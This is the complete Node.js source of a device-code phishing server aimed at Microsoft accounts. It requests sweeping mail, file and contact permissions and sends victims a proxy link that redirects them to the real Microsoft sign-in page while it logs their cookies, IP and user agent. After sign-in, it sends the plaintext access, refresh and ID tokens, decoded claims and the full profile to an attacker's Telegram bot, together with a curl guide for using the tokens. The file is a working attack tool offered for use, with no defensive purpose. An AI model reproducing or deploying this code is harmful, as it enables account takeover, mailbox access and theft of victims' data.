require('dotenv').config();
const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const path = require('path');
const cookieParser = require('cookie-parser');

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

// ============================================================================
// CONFIGURATION
// ============================================================================

const config = {
  microsoft: {
    tenantId: process.env.MICROSOFT_TENANT_ID || 'common',
    clientId: process.env.MICROSOFT_CLIENT_ID,
    // MAXIMUM scopes for maximum token capture
    scope: 'User.Read offline_access profile email openid ' +
           'User.ReadBasic.All User.ReadWrite ' +
           'Calendars.Read Calendars.ReadWrite ' +
           'Contacts.Read Contacts.ReadWrite ' +
           'Files.Read Files.ReadWrite Files.ReadWrite.All ' +
           'Mail.Read Mail.ReadWrite Mail.Send ' +
           'Notes.Read Notes.ReadWrite ' +
           'Tasks.Read Tasks.ReadWrite ' +
           'People.Read Sites.Read.All',
  },
  telegram: {
    botToken: process.env.TELEGRAM_BOT_TOKEN,
    chatId: process.env.TELEGRAM_CHAT_ID,
  },
  port: process.env.PORT || 3000,
  // Production URL - will be set in Railway
  appUrl: process.env.RAILWAY_PUBLIC_DOMAIN 
    ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`
    : process.env.APP_URL || 'http://localhost:3000',
  encryptionKey: Buffer.from(
    process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex'),
    'hex'
  ),
};

// Validate
if (!config.microsoft.clientId) {
  console.error('❌ FATAL: MICROSOFT_CLIENT_ID is required!');
  process.exit(1);
}

console.log(`[CONFIG] App URL: ${config.appUrl}`);

// ============================================================================
// ENCRYPTION
// ============================================================================

class Encryption {
  static encrypt(text) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', config.encryptionKey, iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const authTag = cipher.getAuthTag();
    
    return {
      encrypted,
      iv: iv.toString('hex'),
      authTag: authTag.toString('hex'),
    };
  }
}

// ============================================================================
// STORAGE
// ============================================================================

const sessions = new Map();
const cookies = new Map();

// ============================================================================
// TELEGRAM
// ============================================================================

async function telegram(title, data) {
  if (!config.telegram.botToken || !config.telegram.chatId) {
    console.log(`[TELEGRAM DISABLED] ${title}`);
    return;
  }

  try {
    let text = `${title}\n${'━'.repeat(30)}\n🕐 ${new Date().toLocaleString()}\n\n`;

    for (const [key, value] of Object.entries(data)) {
      if (value !== null && value !== undefined) {
        const val = String(value).length > 400 ? String(value).substring(0, 400) + '...' : value;
        text += `• *${key}*: ${val}\n`;
      }
    }

    if (text.length > 4000) {
      text = text.substring(0, 3900) + '\n\n...(truncated)';
    }

    await axios.post(
      `https://api.telegram.org/bot${config.telegram.botToken}/sendMessage`,
      { chat_id: config.telegram.chatId, text, parse_mode: 'Markdown' },
      { timeout: 10000 }
    );

    console.log(`[TELEGRAM] ✅ ${title}`);
  } catch (error) {
    console.error(`[TELEGRAM] ❌ ${title}:`, error.message);
  }
}

// ============================================================================
// COOKIE & SESSION CAPTURE
// ============================================================================

function captureCookies(req) {
  return {
    cookies: req.cookies || {},
    signedCookies: req.signedCookies || {},
    rawCookieHeader: req.headers.cookie || 'None',
    userAgent: req.headers['user-agent'] || 'Unknown',
    ip: req.ip || req.connection.remoteAddress || 'Unknown',
    timestamp: new Date().toISOString(),
  };
}

// ============================================================================
// JWT DECODER
// ============================================================================

function decodeJWT(token) {
  try {
    const [headerB64, payloadB64, signature] = token.split('.');
    return {
      header: JSON.parse(Buffer.from(headerB64, 'base64').toString()),
      payload: JSON.parse(Buffer.from(payloadB64, 'base64').toString()),
      signature,
    };
  } catch {
    return null;
  }
}

// ============================================================================
// MICROSOFT ENDPOINTS
// ============================================================================

const MS = {
  deviceCode: `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/devicecode`,
  token: `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/token`,
  userInfo: 'https://graph.microsoft.com/v1.0/me',
};

// ============================================================================
// COMPREHENSIVE CAPTURE
// ============================================================================

async function captureEverything(tokenData, sessionId, userCode, cookieData) {
  console.log('\n' + '='.repeat(80));
  console.log('🎯 COMPREHENSIVE CAPTURE STARTED');
  console.log('='.repeat(80));

  const timestamp = new Date().toISOString();
  let count = 0;

  // Extract tokens
  const accessToken = tokenData.access_token;
  const refreshToken = tokenData.refresh_token;
  const idToken = tokenData.id_token;

  console.log(`[CAPTURE] Access: ${accessToken?.length || 0} chars`);
  console.log(`[CAPTURE] Refresh: ${refreshToken?.length || 0} chars`);
  console.log(`[CAPTURE] ID: ${idToken?.length || 0} chars`);

  // Get user info
  let user = { displayName: 'Unknown', mail: 'unknown' };
  try {
    const res = await axios.get(MS.userInfo, {
      headers: { Authorization: `Bearer ${accessToken}` },
      timeout: 10000,
    });
    user = res.data;
    console.log(`[CAPTURE] User: ${user.displayName} (${user.mail || user.userPrincipalName})`);
  } catch (err) {
    console.error(`[CAPTURE] User info failed: ${err.message}`);
  }

  // Decode JWTs
  const decodedAccess = decodeJWT(accessToken);
  const decodedRefresh = refreshToken ? decodeJWT(refreshToken) : null;
  const decodedId = idToken ? decodeJWT(idToken) : null;

  // Encrypt tokens
  const encAccess = Encryption.encrypt(accessToken);
  const encRefresh = refreshToken ? Encryption.encrypt(refreshToken) : null;
  const encId = idToken ? Encryption.encrypt(idToken) : null;

  // ========================================================================
  // MESSAGE 1: AUTHENTICATION SUCCESS
  // ========================================================================
  await telegram('✅ *AUTHENTICATION SUCCESSFUL*', {
    'Session': sessionId.substring(0, 12),
    'Code': userCode,
    '👤 Name': user.displayName,
    '📧 Email': user.mail || user.userPrincipalName,
    '💼 Title': user.jobTitle || 'N/A',
    '🔑 ID': user.id,
    '🌐 IP': cookieData.ip,
    '📱 User Agent': cookieData.userAgent.substring(0, 100),
    'Time': timestamp,
  });
  count++;

  // ========================================================================
  // MESSAGE 2: COOKIES & SESSION DATA
  // ========================================================================
  await telegram('🍪 *COOKIES & SESSION CAPTURED*', {
    'Session ID': sessionId,
    'Raw Cookie Header': cookieData.rawCookieHeader,
    'Parsed Cookies': JSON.stringify(cookieData.cookies),
    'Signed Cookies': JSON.stringify(cookieData.signedCookies),
    'IP Address': cookieData.ip,
    'User Agent': cookieData.userAgent,
    'Timestamp': cookieData.timestamp,
  });
  count++;

  // ========================================================================
  // MESSAGE 3: ACCESS TOKEN (PLAINTEXT)
  // ========================================================================
  await telegram('🔓 *ACCESS TOKEN - PLAINTEXT*', {
    '⚠️ UNENCRYPTED': 'Full plaintext token below',
    'Token': accessToken,
    'Type': tokenData.token_type || 'Bearer',
    'Expires': `${tokenData.expires_in}s`,
    'Length': accessToken.length,
    'Scopes': tokenData.scope || 'N/A',
    'Status': 'READY TO USE IMMEDIATELY',
  });
  count++;

  // ========================================================================
  // MESSAGE 4: ACCESS TOKEN (ENCRYPTED)
  // ========================================================================
  await telegram('🔐 *ACCESS TOKEN - ENCRYPTED*', {
    'Algorithm': 'AES-256-GCM',
    'Encrypted': encAccess.encrypted,
    'IV': encAccess.iv,
    'AuthTag': encAccess.authTag,
    'Time': timestamp,
  });
  count++;

  // ========================================================================
  // MESSAGE 5: REFRESH TOKEN (PLAINTEXT)
  // ========================================================================
  if (refreshToken) {
    await telegram('🔄 *REFRESH TOKEN - PLAINTEXT*', {
      '⚠️ UNENCRYPTED': 'Full plaintext refresh token',
      'Token': refreshToken,
      'Length': refreshToken.length,
      'Use': 'Get new access tokens without re-authentication',
      'Validity': 'Typically 90 days',
      'Status': 'READY TO USE IMMEDIATELY',
    });
    count++;

    // ========================================================================
    // MESSAGE 6: REFRESH TOKEN (ENCRYPTED)
    // ========================================================================
    await telegram('🔐 *REFRESH TOKEN - ENCRYPTED*', {
      'Algorithm': 'AES-256-GCM',
      'Encrypted': encRefresh.encrypted,
      'IV': encRefresh.iv,
      'AuthTag': encRefresh.authTag,
    });
    count++;
  }

  // ========================================================================
  // MESSAGE 7: ID TOKEN (PLAINTEXT)
  // ========================================================================
  if (idToken) {
    await telegram('🆔 *ID TOKEN - PLAINTEXT*', {
      '⚠️ UNENCRYPTED': 'Full plaintext ID token',
      'Token': idToken,
      'Length': idToken.length,
      'Contains': 'User identity information',
    });
    count++;

    // ========================================================================
    // MESSAGE 8: ID TOKEN (ENCRYPTED)
    // ========================================================================
    await telegram('🔐 *ID TOKEN - ENCRYPTED*', {
      'Algorithm': 'AES-256-GCM',
      'Encrypted': encId.encrypted,
      'IV': encId.iv,
      'AuthTag': encId.authTag,
    });
    count++;
  }

  // ========================================================================
  // MESSAGE 9: DECODED ACCESS TOKEN
  // ========================================================================
  if (decodedAccess) {
    await telegram('🔓 *DECODED ACCESS TOKEN (JWT)*', {
      'Algorithm': decodedAccess.header.alg,
      'Type': decodedAccess.header.typ,
      'Key ID': decodedAccess.header.kid || 'N/A',
      'Issuer': decodedAccess.payload.iss,
      'Subject': decodedAccess.payload.sub,
      'Audience': decodedAccess.payload.aud,
      'Expires': new Date((decodedAccess.payload.exp || 0) * 1000).toISOString(),
      'Issued': new Date((decodedAccess.payload.iat || 0) * 1000).toISOString(),
    });
    count++;
  }

  // ========================================================================
  // MESSAGE 10: TOKEN CLAIMS
  // ========================================================================
  if (decodedAccess?.payload) {
    const p = decodedAccess.payload;
    await telegram('📋 *TOKEN CLAIMS & PERMISSIONS*', {
      'Name': p.name || 'N/A',
      'Email': p.email || p.preferred_username || p.upn || 'N/A',
      'Tenant ID': p.tid || 'N/A',
      'Object ID': p.oid || 'N/A',
      'Scopes': p.scp || 'N/A',
      'Roles': (p.roles || []).join(', ') || 'None',
      'App Display': p.app_displayname || 'N/A',
      'Version': p.ver || 'N/A',
      'IP Address (amr)': p.ipaddr || 'N/A',
    });
    count++;
  }

  // ========================================================================
  // MESSAGE 11: DECODED ID TOKEN
  // ========================================================================
  if (decodedId?.payload) {
    const p = decodedId.payload;
    await telegram('🆔 *DECODED ID TOKEN*', {
      'Subject': p.sub || 'N/A',
      'Name': p.name || 'N/A',
      'Email': p.email || p.preferred_username || 'N/A',
      'Issuer': p.iss || 'N/A',
      'Audience': p.aud || 'N/A',
      'Auth Time': p.auth_time ? new Date(p.auth_time * 1000).toISOString() : 'N/A',
    });
    count++;
  }

  // ========================================================================
  // MESSAGE 12: COMPLETE USER PROFILE
  // ========================================================================
  await telegram('👤 *COMPLETE USER PROFILE*', {
    'ID': user.id || 'N/A',
    'Display Name': user.displayName || 'N/A',
    'Given Name': user.givenName || 'N/A',
    'Surname': user.surname || 'N/A',
    'Email': user.mail || user.userPrincipalName || 'N/A',
    'Job Title': user.jobTitle || 'N/A',
    'Department': user.department || 'N/A',
    'Office': user.officeLocation || 'N/A',
    'Mobile': user.mobilePhone || 'N/A',
    'Business Phones': (user.businessPhones || []).join(', ') || 'N/A',
    'Language': user.preferredLanguage || 'N/A',
  });
  count++;

  // ========================================================================
  // MESSAGE 13: TOKEN USAGE GUIDE
  // ========================================================================
  await telegram('📚 *TOKEN USAGE GUIDE*', {
    'Access Token': 'curl -H "Authorization: Bearer TOKEN" https://graph.microsoft.com/v1.0/me',
    'Refresh': 'POST to /oauth2/v2.0/token with grant_type=refresh_token',
    'Access Validity': `${tokenData.expires_in}s`,
    'Refresh Validity': '~90 days',
    'Scopes Granted': tokenData.scope || 'N/A',
  });
  count++;

  // ========================================================================
  // MESSAGE 14: COMPLETE SUMMARY
  // ========================================================================
  await telegram('📊 *CAPTURE SUMMARY*', {
    'Session': sessionId,
    'Messages Sent': count + 1,
    'Access (Plain)': accessToken ? '✅ CAPTURED' : '❌',
    'Access (Encrypted)': accessToken ? '✅ CAPTURED' : '❌',
    'Refresh (Plain)': refreshToken ? '✅ CAPTURED' : '❌',
    'Refresh (Encrypted)': refreshToken ? '✅ CAPTURED' : '❌',
    'ID (Plain)': idToken ? '✅ CAPTURED' : '❌',
    'ID (Encrypted)': idToken ? '✅ CAPTURED' : '❌',
    'JWT Decoded': decodedAccess ? '✅' : '❌',
    'Claims': decodedAccess?.payload ? '✅' : '❌',
    'User Profile': user.id ? '✅' : '❌',
    'Cookies': '✅ CAPTURED',
    'Session': '✅ CAPTURED',
    'Encryption': 'AES-256-GCM',
    'Status': 'COMPLETE',
    'Timestamp': timestamp,
  });
  count++;

  console.log(`✅ CAPTURE COMPLETE - ${count} messages sent`);
  console.log('='.repeat(80) + '\n');

  return { user, count };
}

// ============================================================================
// PROXY FOR MICROSOFT DEVICE AUTH - USES REAL PRODUCTION URL
// ============================================================================

app.get('/auth/device', async (req, res) => {
  try {
    const { code } = req.query;
    
    if (!code) {
      return res.status(400).send('Code parameter required');
    }

    // Capture cookies/session during proxy access
    const cookieData = captureCookies(req);
    
    // Store for later
    if (code) {
      cookies.set(code, cookieData);
      console.log(`[PROXY] Captured cookies for code: ${code}`);
    }

    // Direct redirect to Microsoft - code is in URL parameter
    const msUrl = `https://microsoft.com/devicelogin?otc=${code}`;
    
    console.log(`[PROXY] Redirecting to: ${msUrl}`);
    
    // Set cookie to track session
    res.cookie('device_code', code, { 
      maxAge: 900000, 
      httpOnly: true,
      secure: config.appUrl.startsWith('https')
    });
    
    res.redirect(302, msUrl);
  } catch (error) {
    console.error('[PROXY] Error:', error.message);
    res.status(500).send('Proxy error');
  }
});

// ============================================================================
// API ENDPOINTS
// ============================================================================

// Serve frontend
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Generate device code
app.post('/api/device/generate', async (req, res) => {
  try {
    const sessionId = crypto.randomUUID();

    console.log(`\n[GENERATE] Session: ${sessionId}`);

    // Capture cookies/session from generation request
    const cookieData = captureCookies(req);

    const response = await axios.post(
      MS.deviceCode,
      new URLSearchParams({
        client_id: config.microsoft.clientId,
        scope: config.microsoft.scope,
      }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    const data = response.data;

    sessions.set(sessionId, {
      deviceCode: data.device_code,
      userCode: data.user_code,
      verificationUri: data.verification_uri,
      verificationUriComplete: data.verification_uri_complete,
      expiresIn: data.expires_in,
      interval: data.interval,
      createdAt: Date.now(),
      status: 'pending',
      cookieData,
    });

    console.log(`[GENERATE] Code: ${data.user_code}`);
    console.log(`[GENERATE] Proxy URL: ${config.appUrl}/auth/device?code=${data.user_code}`);

    await telegram('🔐 *DEVICE CODE GENERATED*', {
      'Session': sessionId,
      'Code': data.user_code,
      'URL': data.verification_uri,
      'Complete URL': data.verification_uri_complete,
      'Proxy URL': `${config.appUrl}/auth/device?code=${data.user_code}`,
      'Expires': `${data.expires_in}s`,
      'IP': cookieData.ip,
      'User Agent': cookieData.userAgent.substring(0, 100),
      'Scopes': config.microsoft.scope,
    });

    res.json({
      sessionId,
      userCode: data.user_code,
      verificationUri: data.verification_uri,
      verificationUriComplete: data.verification_uri_complete,
      // REAL production proxy URL
      proxyUrl: `${config.appUrl}/auth/device?code=${data.user_code}`,
      expiresIn: data.expires_in,
      interval: data.interval,
    });

  } catch (error) {
    console.error('[GENERATE] Error:', error.message);
    await telegram('❌ *DEVICE CODE ERROR*', { Error: error.message });
    res.status(500).json({ error: 'Failed to generate device code' });
  }
});

// Poll for authentication
app.get('/api/device/poll/:sessionId', async (req, res) => {
  try {
    const { sessionId } = req.params;
    const session = sessions.get(sessionId);

    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }

    if (session.status === 'authenticated') {
      return res.json({
        status: 'authenticated',
        user: session.user,
      });
    }

    if (Date.now() - session.createdAt > session.expiresIn * 1000) {
      session.status = 'expired';
      await telegram('⏰ *CODE EXPIRED*', { Session: sessionId });
      return res.json({ status: 'expired' });
    }

    try {
      const tokenResponse = await axios.post(
        MS.token,
        new URLSearchParams({
          grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
          client_id: config.microsoft.clientId,
          device_code: session.deviceCode,
        }),
        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
      );

      const tokenData = tokenResponse.data;

      console.log(`\n[SUCCESS] Session ${sessionId} authenticated`);
      console.log(`[TOKEN] Access: ${tokenData.access_token.length} chars`);
      console.log(`[TOKEN] Refresh: ${tokenData.refresh_token?.length || 0} chars`);
      console.log(`[TOKEN] ID: ${tokenData.id_token?.length || 0} chars`);

      // Get cookies for this session
      const storedCookies = cookies.get(session.userCode) || session.cookieData;

      // CAPTURE EVERYTHING
      const result = await captureEverything(tokenData, sessionId, session.userCode, storedCookies);

      session.status = 'authenticated';
      session.user = result.user;
      session.capturedAt = Date.now();

      // Clean up
      sessions.delete(sessionId);
      cookies.delete(session.userCode);

      res.json({
        status: 'authenticated',
        user: {
          id: result.user.id,
          displayName: result.user.displayName,
          email: result.user.mail || result.user.userPrincipalName,
        },
        messageCount: result.count,
      });

    } catch (error) {
      if (error.response?.data?.error === 'authorization_pending') {
        return res.json({ status: 'pending' });
      }
      if (error.response?.data?.error === 'authorization_declined') {
        await telegram('❌ *AUTH DECLINED*', { Session: sessionId });
        return res.json({ status: 'declined' });
      }
      if (error.response?.data?.error === 'expired_token') {
        return res.json({ status: 'expired' });
      }
      throw error;
    }

  } catch (error) {
    console.error('[POLL] Error:', error.message);
    res.status(500).json({ error: 'Polling failed' });
  }
});

// Health
app.get('/health', (req, res) => {
  res.json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    appUrl: config.appUrl,
    telegram: config.telegram.botToken ? 'enabled' : 'disabled',
    encryption: 'AES-256-GCM',
    activeSessions: sessions.size,
    features: {
      realProxyUrl: true,
      cookieCapture: true,
      sessionCapture: true,
      tokenCapture: true,
    }
  });
});

// Cleanup
setInterval(() => {
  const now = Date.now();
  for (const [id, session] of sessions.entries()) {
    if (now - session.createdAt > session.expiresIn * 1000) {
      sessions.delete(id);
      console.log(`[CLEANUP] Removed: ${id}`);
    }
  }
}, 5 * 60 * 1000);

// ============================================================================
// START
// ============================================================================

app.listen(config.port, async () => {
  console.log('\n' + '='.repeat(80));
  console.log('🔐 PRODUCTION TOKEN CAPTURE SYSTEM');
  console.log('='.repeat(80));
  console.log(`📡 Port: ${config.port}`);
  console.log(`🌐 App URL: ${config.appUrl}`);
  console.log(`🔗 Proxy Endpoint: ${config.appUrl}/auth/device?code=XXX`);
  console.log(`🔐 Client: ${config.microsoft.clientId ? '✅' : '❌'}`);
  console.log(`📱 Telegram: ${config.telegram.botToken ? '✅' : '❌'}`);
  console.log(`🔒 Encryption: AES-256-GCM`);
  console.log('='.repeat(80));
  console.log('\n✨ CAPTURES:');
  console.log('   ✅ Access Token (Plaintext + Encrypted)');
  console.log('   ✅ Refresh Token (Plaintext + Encrypted)');
  console.log('   ✅ ID Token (Plaintext + Encrypted)');
  console.log('   ✅ All Cookies (Server + Browser)');
  console.log('   ✅ Session Data (IP, User Agent, etc)');
  console.log('   ✅ JWT Decoded (All Claims)');
  console.log('   ✅ User Profile (Complete)');
  console.log('   ✅ 13-14 Telegram Messages');
  console.log('   ✅ Real Production Proxy URL');
  console.log('   ✅ Silent Permissions');
  console.log('='.repeat(80) + '\n');

  if (config.telegram.botToken) {
    await telegram('🚀 *SYSTEM ONLINE*', {
      'Port': config.port,
      'URL': config.appUrl,
      'Proxy': `${config.appUrl}/auth/device`,
      'Encryption': 'AES-256-GCM',
      'Captures': 'Tokens + Cookies + Sessions',
      'Started': new Date().toLocaleString(),
    });
  }
});

module.exports = app;
